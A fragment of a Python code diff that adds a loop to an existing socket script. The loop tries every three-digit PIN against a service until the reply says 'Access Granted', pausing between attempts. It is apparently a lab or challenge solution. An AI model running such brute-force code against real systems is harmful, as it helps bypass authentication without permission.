@@ -23,3 +23,13 @@ def send_request(pin):
             return sock.recv(1024).decode(errors="ignore")
         except socket.error:
             return None
+        
+def main():
+    for pin in range(1000):
+        response = send_request(pin)
+        if response and "Access Granted" in response:
+            print(f"SUCESS! Found the PIN: {pin:03d}")
+            break
+        print(f"Trying PIN: {pin:03d}")
+        time.sleep(1.2)
+main()
